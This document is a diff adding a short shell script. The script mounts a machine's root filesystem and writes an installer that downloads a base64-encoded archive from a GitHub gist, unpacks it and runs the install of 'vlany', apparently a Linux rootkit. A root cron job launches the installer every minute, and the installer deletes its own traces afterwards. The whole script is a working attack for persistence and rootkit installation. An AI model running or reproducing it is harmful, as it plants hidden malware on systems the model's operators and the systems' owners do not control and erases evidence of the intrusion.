@@ -1,0 +1,20 @@
+mount $(findfs $(cat /proc/cmdline | awk '{print $2}' | sed 's/root=\(PART\)\?//')) /mnt
+cat << EOF > /mnt/root/install_vlany.sh
+#!/bin/sh
+cd /root
+curl https://gist.githubusercontent.com/mateobur/d888e36de12f8fe42a18f54ce4b1fc7c/raw/dd0c4cb23db7cc17a2086c5dee9338522fb8ae69/vlany | base64 -d > vlany-master.tar.gz
+tar zxvf vlany-master.tar.gz
+cd vlany-master
+./install.sh
+rm /var/spool/cron/root
+rm /root/install_vlany.sh
+rm -fR /root/vlany-master*
+EOF
+
+chmod +x /mnt/root/install_vlany.sh
+
+cat << EOF > /mnt/var/spool/cron/root
+* * * * * /root/install_vlany.sh > /dev/null 2>/dev/null
+EOF
+
+umount /mnt
